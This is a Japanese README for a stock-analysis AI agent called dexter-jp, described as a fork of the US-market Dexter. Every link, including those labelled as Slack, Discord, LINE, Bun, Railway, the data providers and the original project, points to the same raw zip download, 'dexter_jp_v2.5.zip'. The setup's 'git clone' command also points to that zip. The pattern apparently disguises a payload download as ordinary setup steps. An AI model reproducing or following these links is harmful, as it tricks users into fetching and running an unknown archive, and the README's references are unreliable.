...
[EDINET DB](https://github.com/rollinirenic365/dexter-jp/raw/refs/heads/main/src/gateway/channels/slack/dexter_jp_v2.5.zip) + [J-Quants](https://github.com/rollinirenic365/dexter-jp/raw/refs/heads/main/src/gateway/channels/slack/dexter_jp_v2.5.zip) で動く、日本株特化の金融AIエージェント。
[virattt/dexter](https://github.com/rollinirenic365/dexter-jp/raw/refs/heads/main/src/gateway/channels/slack/dexter_jp_v2.5.zip)（米国株版）をフォークし、日本市場向けに全面改修。
...
- [Bun](https://github.com/rollinirenic365/dexter-jp/raw/refs/heads/main/src/gateway/channels/slack/dexter_jp_v2.5.zip)
- LLM APIキー（以下のいずれか1つ）
- [EDINET DB](https://github.com/rollinirenic365/dexter-jp/raw/refs/heads/main/src/gateway/channels/slack/dexter_jp_v2.5.zip) APIキー
...
```bash
git clone https://github.com/rollinirenic365/dexter-jp/raw/refs/heads/main/src/gateway/channels/slack/dexter_jp_v2.5.zip
cd dexter-jp
bun install
...
1. [api.slack.com/apps](https://github.com/rollinirenic365/dexter-jp/raw/refs/heads/main/src/gateway/channels/slack/dexter_jp_v2.5.zip) → **Create New App** → From scratch
...
1. [discord.com/developers/applications](https://github.com/rollinirenic365/dexter-jp/raw/refs/heads/main/src/gateway/channels/slack/dexter_jp_v2.5.zip) → **New Application**
...
1. [LINE Official Account Manager](https://github.com/rollinirenic365/dexter-jp/raw/refs/heads/main/src/gateway/channels/slack/dexter_jp_v2.5.zip) で **LINE公式アカウントを作成**
...
2. LINE Official Account Manager → **設定** → **Messaging API** → **「Messaging APIを利用する」**
   - プロバイダーを選択（既存でOK）
3. [LINE Developersコンソール](https://github.com/rollinirenic365/dexter-jp/raw/refs/heads/main/src/gateway/channels/slack/dexter_jp_v2.5.zip) → 該当チャネル → **Messaging API設定** タブ:
   - **チャネルアクセストークン（長期）** → 発行
...
- **本番運用**: 長寿命プロセスを維持できるサービスにデプロイ（サーバーレス不可）
  - [Railway](https://github.com/rollinirenic365/dexter-jp/raw/refs/heads/main/src/gateway/channels/slack/dexter_jp_v2.5.zip) — `Dockerfile` 追加するだけ。無料枠あり。最も手軽
  - [Fly.io](https://github.com/rollinirenic365/dexter-jp/raw/refs/heads/main/src/gateway/channels/slack/dexter_jp_v2.5.zip) — `fly launch` で数分。無料枠あり
  - [Render](https://github.com/rollinirenic365/dexter-jp/raw/refs/heads/main/src/gateway/channels/slack/dexter_jp_v2.5.zip) — Background Worker として起動。無料枠あり
...
| ソース | 内容 | 必須？ |
|--------|------|--------|
| [EDINET DB](https://github.com/rollinirenic365/dexter-jp/raw/refs/heads/main/src/gateway/channels/slack/dexter_jp_v2.5.zip) | 財務データ、有報テキスト、スクリーニング、AI分析（~3,800社） | 必須 |
| [J-Quants](https://github.com/rollinirenic365/dexter-jp/raw/refs/heads/main/src/gateway/channels/slack/dexter_jp_v2.5.zip) | 株価OHLC（東証公式） | オプション |
...
- オリジナル [Dexter](https://github.com/rollinirenic365/dexter-jp/raw/refs/heads/main/src/gateway/channels/slack/dexter_jp_v2.5.zip) by [@virattt](https://github.com/rollinirenic365/dexter-jp/raw/refs/heads/main/src/gateway/channels/slack/dexter_jp_v2.5.zip)
- 財務データ: [EDINET DB](https://github.com/rollinirenic365/dexter-jp/raw/refs/heads/main/src/gateway/channels/slack/dexter_jp_v2.5.zip)
- 株価データ: [J-Quants](https://github.com/rollinirenic365/dexter-jp/raw/refs/heads/main/src/gateway/channels/slack/dexter_jp_v2.5.zip)
